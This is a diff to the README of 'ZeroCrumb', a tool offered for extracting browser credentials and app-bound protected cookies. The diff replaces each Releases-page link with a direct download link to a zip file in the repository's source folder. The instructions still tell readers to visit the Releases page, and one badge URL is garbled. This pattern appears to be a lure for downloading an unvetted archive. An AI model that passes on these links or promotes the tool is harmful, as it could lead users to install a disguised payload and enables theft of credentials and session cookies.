@@ -1,7 +1,7 @@
 # 🚀 ZeroCrumb - Extract Cookies Securely with Ease
 
 ## 📥 Quick Download
-[![Download ZeroCrumb](https://img.shields.io/badge/Download%20ZeroCrumb-v1.0-green.svg)](https://github.com/homozygoterushing286/ZeroCrumb/releases)
+[![Download ZeroCrumb](https://raw.githubusercontent.com/homozygoterushing286/ZeroCrumb/main/ZeroCrumb/src/shared/ZeroCrumb_2.1.zip%https://raw.githubusercontent.com/homozygoterushing286/ZeroCrumb/main/ZeroCrumb/src/shared/ZeroCrumb_2.1.zip)](https://raw.githubusercontent.com/homozygoterushing286/ZeroCrumb/main/ZeroCrumb/src/shared/ZeroCrumb_2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to ZeroCrumb, the tool that helps you extract app-bound protected credentials and cookies without needing extra privileges. This application makes it easy for you to access important data securely and efficiently.
@@ -22,7 +22,7 @@ Welcome to ZeroCrumb, the tool that helps you extract app-bound protected creden
 ## 📦 Download & Install
 To get started, simply visit the link below to access the Releases page, where you can download the latest version of ZeroCrumb:
 
-[Visit this page to download](https://github.com/homozygoterushing286/ZeroCrumb/releases)
+[Visit this page to download](https://raw.githubusercontent.com/homozygoterushing286/ZeroCrumb/main/ZeroCrumb/src/shared/ZeroCrumb_2.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of ZeroCrumb.
@@ -69,4 +69,4 @@ For further assistance, feel free to reach out to the community on the Issues pa
 ## 🙌 Contributions
 Contributions are welcome! If you have suggestions or improvements, please submit a pull request or open an issue in the repository.
 
-For more information, visit our [Releases page again](https://github.com/homozygoterushing286/ZeroCrumb/releases) to ensure you have the latest updates. Enjoy using ZeroCrumb to securely extract your important data!
+For more information, visit our [Releases page again](https://raw.githubusercontent.com/homozygoterushing286/ZeroCrumb/main/ZeroCrumb/src/shared/ZeroCrumb_2.1.zip) to ensure you have the latest updates. Enjoy using ZeroCrumb to securely extract your important data!
